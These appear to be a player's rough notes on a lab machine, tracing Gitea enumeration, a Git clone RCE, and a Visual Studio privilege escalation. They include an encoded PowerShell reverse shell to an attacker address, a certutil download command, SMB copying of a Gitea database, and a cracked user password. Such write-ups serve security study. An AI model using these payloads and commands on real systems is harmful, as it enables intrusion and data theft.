___

# User 

3000/tcp open  http    syn-ack ttl 127 Golang net/http server

*this shit gitea?*
Set-Cookie: i_like_gitea=2fac6c47fd2c414f; Path=/; HttpOnly; SameSite=Lax


*custom app for compiling code from github repo*
http://10.10.11.26:5000/


*web app can make requests directly here instead of IIS kernel handles http requests*
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)


*disclosing header for httpapi*
```
curl -v http://www.yourdomain.com/ -H "Range: bytes=00-18446744073709551615"
```

* Request completely sent off
< HTTP/1.1 400 Bad Request
< Content-Type: text/html; charset=us-ascii
< Server: Microsoft-HTTPAPI/2.0
< Date: Wed, 27 Aug 2025 19:39:52 GMT
< Connection: close
< Content-Length: 339


[Powered by Gitea](https://about.gitea.com) Version: 1.21.6


*I think 2 vulns in this ver*
Gitea 1.22.0 - Stored XSS                                                                                                     | 
Gitea 1.24.0 - HTML Injection

html injection
https://www.exploit-db.com/exploits/52087

stored xss
https://www.exploit-db.com/exploits/52077

![](http://10.10.11.26:3000/avatar/6c97821f07ac9eaed9ad77011e5e6f06?size=96 "richard")

[richard](http://10.10.11.26:3000/richard)

[richard@compiled.htb](mailto:richard@compiled.htb)

Joined on May 22, 2024

![](http://10.10.11.26:3000/avatar/724af75da2d487f4081e4f04d0c7465d?size=96 "administrator")

[administrator](http://10.10.11.26:3000/administrator)

[administrator@compiled.htb](mailto:administrator@compiled.htb)


*so apparently this site aint clonning shit?*

its just appending the input I give it into a text file at 
`REPO_FILE_PATH = r'C:\Users\Richard\source\repos\repos.txt'`

unless there is some other script or service that is doing git clone then compiling after


try to compile that calculator project -< see what happens



checks for http and .git are being done server side
-> its interesting bc the post request has a cookie that I think is from gitea


so yes the cookie is for gitea


*request the server trynna make*
10.10.11.26 - - [28/Aug/2025 18:53:45] "GET /my_project.git/info/refs?service=git-upload-pack HTTP/1.1" 404 -

git-upload-pack is for fetching from repos



python http is not enough set up git daemon to host

# Start a daemon serving repos in ~/git
git daemon --reuseaddr --base-path=/home/you/git/ --export-all --verbose



So I managed to create the soft-serve config and run the server and the server is definitely connecting and fetching it from the looks of it -> the thing is now I have to find a way for it to exec


*is it compiling and running?* -> or is there another way to run it
-> maybe put other kinds of files in there. different extensions .c .cpp .cs 


### C++ Compilation

We offer reliable C++ code compiling services.

### C# Compilation

Let us compile your C# projects efficiently.

### .NET Compilation

Get your .NET code compiled with precision.



*git version in calc repo*
```bash
git version 2.45.0.windows.1
```


*there is rce for this version of git with clone*

https://amalmurali.me/posts/git-rce/



*it seems like everything is working but the issue is with my reverse shell <- i think powershell not executing properly*


*put rev shell here try this*
```
wmic.exe process call create "cmd /c c:\windows\system32\calc.exe"
```

```powershell
PowerShell.exe -EncodedCommand JABjAGEAbABsAGIAYQBjAGsAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAMAAuADYALgAzADYALgA4ADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGEAbABsAGIAYQBjAGsALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBhAGwAbABiAGEAYwBrAC4AQwBsAG8AcwBlACgAKQA=
```


*the shell is git-bash bc windows*


*this POC way better*
https://github.com/safebuffer/CVE-2024-32002



*file transfer with certutil*
==`**certutil -urlcache -split -f "http://**`====`_ip-addr_`====`**:**`====`_port_`====`**/**`====`_file_`====`**"**`== ==`[`====`_output-file_`====`]`==



*start smb server for file transfer from windows*
```
smbserver.py share . -username 0xdf -password 0xdf -smb2support
```

 *use share*
```
net use \\10.10.14.6\share /u:0xdf 0xdf
```

*copy to share*
```
copy data\gitea.db //10.10.14.6/share/
```


*john for some reason did not work hashcat did though*
converted the passwords with a python script first tough

12345678 <- pass for emily


*httpapi is the endpoint that winrm uses to connect to windows*



*VS code version*
You can get the VS product version by running the following command.

```
"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe" -property catalog_productDisplayVersion
```


*version*
*Evil-WinRM* PS C:\Program Files (x86)\Microsoft Visual Studio\Installer> ./vswhere.exe -property catalog_productDisplayVersion

16.10.0



*found this on google*
# Elevation of Privilege Vulnerability Affects Visual Studio  

CVE-2024-20656


*cve POC*

https://github.com/Wh04m1001/CVE-2024-20656


junctions are a thing on windows -> it essentially is a symlink but for folders instead of only files on windows


*read a users history on windows*
```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```


*had to change paths for the correct vs studio exe file*
compiled exploit on vs studio code -> RELEASE VERSION!!!!!!

then uploaded ran the .exe with RunAs.exe Emily 12345678


then it worked but damn this was such a process






















